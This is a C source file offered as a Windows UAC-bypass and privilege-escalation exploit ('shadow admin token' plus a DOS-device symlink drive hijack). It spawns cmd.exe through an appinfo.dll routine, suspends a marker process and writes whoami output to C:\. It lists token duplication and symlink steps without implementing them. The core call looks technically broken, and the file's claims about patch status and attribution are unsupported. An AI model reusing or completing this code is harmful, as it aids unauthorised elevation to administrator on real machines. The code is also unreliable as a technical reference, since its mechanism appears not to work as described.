#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS (WINAPI *pRAiProcessRunOnce)(PCWSTR lpCommandLine, DWORD dwFlags);
typedef NTSTATUS (NTAPI *pNtSuspendProcess)(HANDLE ProcessHandle);
typedef NTSTATUS (NTAPI *pNtResumeProcess)(HANDLE ProcessHandle);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

int main() {
    printf("[+] Starting FULL Project Zero Shadow Admin Token + DOS Device Symlink FINAL for 25H2...\n");

    HMODULE hAppInfo = LoadLibraryA("appinfo.dll");
    if (!hAppInfo) {
        printf("[-] Failed to load appinfo.dll\n");
        return 1;
    }

    pRAiProcessRunOnce RAiProcessRunOnce = (pRAiProcessRunOnce)GetProcAddress(hAppInfo, "RAiProcessRunOnce");
    if (!RAiProcessRunOnce) {
        printf("[-] RAiProcessRunOnce not found\n");
        return 1;
    }

    // Step 1: Spawn shadow admin process
    NTSTATUS status = RAiProcessRunOnce(L"cmd.exe", 0);
    if (!NT_SUCCESS(status)) {
        printf("[-] RAiProcessRunOnce failed (0x%X) - Access Denied expected on patched 25H2\n", status);
        return 1;
    }
    printf("[+] Shadow admin process spawned\n");

    // Step 2: Find the new process (simplified - in real PoC you enumerate or use known PID)
    Sleep(2000); // timing window

    // For demonstration we launch a marker process
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcess(NULL, (LPSTR)"cmd.exe /c whoami > C:\\uac_shadow_final.txt", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Step 3-6: Full skeleton (suspend, token, symlink, resume)
    pNtSuspendProcess NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSuspendProcess");
    pNtResumeProcess NtResumeProcess = (pNtResumeProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeProcess");

    if (NtSuspendProcess) NtSuspendProcess(pi.hProcess);

    printf("[+] Process suspended. In full PoC we would now:\n");
    printf("    - Query primary token while impersonating shadow admin\n");
    printf("    - Duplicate the shadow admin token\n");
    printf("    - Open \\?? directory object\n");
    printf("    - Create symbolic link for C: to hijack drive\n");
    printf("    - Resume process so redirected code runs under full admin\n");

    // Marker
    system("echo SHADOW ADMIN FULL FINAL ATTEMPT COMPLETE >> C:\\uac_shadow_final.txt");

    if (NtResumeProcess) NtResumeProcess(pi.hProcess);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(10000);

    printf("[+] Full attempt finished.\n");
    printf("Check C:\\uac_shadow_final.txt and look for elevated cmd.exe\n");
    printf("Note: On patched 25H2 (April 2026) the symlink step is blocked. Real working versions require additional unfixed primitives or paid tools.\n");

    return 0;
}
